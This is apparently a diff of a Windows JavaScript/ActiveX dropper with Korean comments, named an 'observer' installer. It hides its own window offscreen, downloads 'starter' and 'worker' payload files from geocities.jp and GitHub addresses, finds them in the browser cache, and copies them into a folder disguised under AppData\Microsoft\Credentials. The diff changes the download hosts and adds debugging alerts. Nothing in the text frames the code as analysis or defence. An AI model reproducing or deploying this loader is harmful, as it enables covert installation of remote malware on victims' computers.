@@ -1,8 +1,8 @@
-﻿var starter_32_url = "http://www.geocities.jp/cstest4141/abc32.tmp"; // 옵저버32 스타터 주소
-var starter_64_url = "http://www.geocities.jp/cstest4141/abc64.tmp"; // 옵저버64 스타터 주소
+var starter_32_url = "http://www.geocities.jp/cstest4141/abc32.tmp"; // 옵저버32 스타터 주소
+var starter_64_url = "https://github.com/acacmil/abc/raw/master/abc64.tmp"; // 옵저버64 스타터 주소
 var worker_32_url = "http://www.geocities.jp/cstest4141/def32.tmp"; // 옵저버32 커널 주소
-var worker_64_url = "http://www.geocities.jp/cstest4141/def64.tmp"; // 옵저버64 커널 주소
-var folder_path="%userprofile%\AppData\Roaming\Microsoft\Credentials\1.0";// setup 폴더
+var worker_64_url = "https://github.com/acacmil/abc/raw/master/def64.tmp"; // 옵저버64 커널 주소
+var folder_path="%userprofile%\\AppData\\Roaming\\Microsoft\\Credentials\\1.0";// setup 폴더
 var starter_32 = "abc32.tmp"; //옵저버32 스타터이름
 var starter_64 = "abc64.tmp"; //옵저버64 스타터이름
 var worker_32 = "def32.tmp"; //옵저버32 워커이름
@@ -21,16 +21,19 @@ var flag;
 // 1이면 스타터 다운, 0이면 워커 다운
 var fso = new ActiveXObject("Scripting.FileSystemObject"); 
 var wShell = new ActiveXObject("WScript.Shell");
-
+window.resizeTo(1,1); 
+window.moveTo(5000,5000);
 IMG_CHECK(); //스크립트 시작
-
+window.close();
 function IMG_CHECK()
 {
-	window.resizeTo(1,1); 
-	window.moveTo(5000,5000);
+	//window.resizeTo(1,1); 
+	//window.moveTo(5000,5000);
+    alert("1");
     try
     {
 		if(window.navigator.platform == 'Win64'){ //64비트인 경우
+		    alert("2");
 			flag=1; //스타터 다운 
 			SEND(starter_64_url,starter_64);
 			flag=0; //워커 다운
@@ -54,13 +57,17 @@ function SEND(file_url,file) // 리퀘스트 send하여 파일을 임시폴더�
 {
 	try
 	{ 
+	    alert("3");
 		if (window.XMLHttpRequest) {
             var xmlHttp = new XMLHttpRequest(); //윈7이상 버전
         } 
         else {
             var xmlHttp = new ActiveXObject("Microsoft.XMLHTTP"); //윈xp
         }
+        alert("3.1");
+        alert(file_url);
 		xmlHttp.open( "GET", file_url, false ); // 리퀘스트 보내서 인터넷 템프폴더에 파일이 저장되도록함
+		alert("3.2");
 		xmlHttp.send( null );		
 		FIND_FILE(file); // 파일을 찾으러감
 	}
@@ -72,7 +79,8 @@ function SEND(file_url,file) // 리퀘스트 send하여 파일을 임시폴더�
 function FIND_FILE(file) // 탬프폴더에서 파일 찾음
 {
 	try
-	{		
+	{
+	    alert("4");
 		var tempfilepath;
 		var filename;
 		var sptemp;		
@@ -116,6 +124,7 @@ function R_FIND(str,str2) //재귀적으로 인터넷 템프폴더를 뒤져서 
 
 function SIZE_CHECK(tempfilepath) // 사이즈 체크
 {	
+    alert("5");
 	var ofile = fso.OpenTextFile(tempfilepath,1,true,-1);
 	var size = fso.getfile(tempfilepath).size;
 	var sdata = ofile.Read(size/2);
@@ -123,7 +132,8 @@ function SIZE_CHECK(tempfilepath) // 사이즈 체크
 
 	var checklen = (sdata.charCodeAt(1)&0xffff)+(sdata.charCodeAt(2)&0xffff)*0x10000;
 	fso.DeleteFile(tempfilepath);
-
+    alert(checklen);
+    alert(size);
 	if(checklen != size) //파일 헤더로부터 얻은 파일크기와 다운받은 파일 크기를 비교함.
 	{		
 		return 0;
@@ -131,12 +141,14 @@ function SIZE_CHECK(tempfilepath) // 사이즈 체크
 	else
 	{
 		var savepath = MAKE_FOLDER(); //복사할 폴더 만듦
+		alert(savepath);
 		return COPY_FILE(sdata, savepath, size); // 파일사이즈가 같을때만복사를 실행
 	}
 }
 
 function MAKE_FOLDER() // 스타터, 워커 설치할 폴더 만듦
 {
+    alert("6");
 	try
 	{	
 		var folder_path_splited = wShell.ExpandEnvironmentStrings(folder_path).split('\\');
